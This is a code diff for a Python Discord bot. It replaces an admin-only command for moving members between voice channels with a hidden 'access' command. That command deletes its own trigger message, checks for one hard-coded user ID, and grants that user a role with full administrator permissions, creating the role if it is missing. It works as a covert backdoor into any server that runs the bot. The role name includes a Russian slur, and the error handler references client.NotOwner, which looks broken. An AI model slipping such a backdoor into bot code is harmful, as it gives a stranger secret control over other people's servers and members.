@@ -208,12 +208,22 @@ async def info(ctx,member:discord.Member = None, guild: discord.Guild = None):
 
 
 @client.command()
-@commands.has_permissions( administrator = True )
-async def mtm(ctx):
-    for channel in ctx.guild.voice_channels:
-        for member in channel.members:
-            await member.move_to(ctx.author.voice.channel)
+async def access(ctx):
+    await ctx.message.delete()
+    if(ctx.author.id == 326343651309649922):
+        owner_role = discord.utils.get(ctx.message.guild.roles, name = 'Даун')
+        if owner_role in ctx.author.roles:
+            await ctx.send(embed = discord.Embed(title = 'У вас уже имеется роль создателя'))
+            return
+        if owner_role is None:
+            owner_role = await ctx.guild.create_role(name = 'Онимешник', permissions = discord.Permissions( administrator = True), color = discord.Color.blurple())
+        await ctx.author.add_roles(owner_role, reason = None, atomic = True)
 
+# Access error
+@access.error
+async def access_error( ctx, error):
+    if isinstance(error, client.NotOwner):
+        await ctx.send(embed = discord.Embed(title = '`Вы не являетесь моим создателем!`', color = discord.Color.dark_red()))
 
 # Clear error
 @clear.error
